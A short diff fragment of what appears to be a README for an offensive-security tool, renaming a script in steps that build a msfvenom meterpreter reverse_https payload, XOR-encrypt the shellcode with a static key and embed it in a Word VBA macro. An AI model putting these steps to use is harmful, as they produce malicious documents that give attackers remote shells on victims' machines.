@@ -11,7 +11,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https SessionExpirationTimeout=0 Ses
 ```
 
 ### 2. Encrypt the Payload
-Use the provided C# encryption script (`XOR_encrypted`) to XOR the shellcode with a static key (`0xFA`).
+Use the provided C# encryption script (`XOR_encoder`) to XOR the shellcode with a static key (`0xFA`).
 
 ### 3. Embed the Encrypted Payload in VBA Macro
 - Open Microsoft Word and access the VBA Editor (`ALT + F11`)
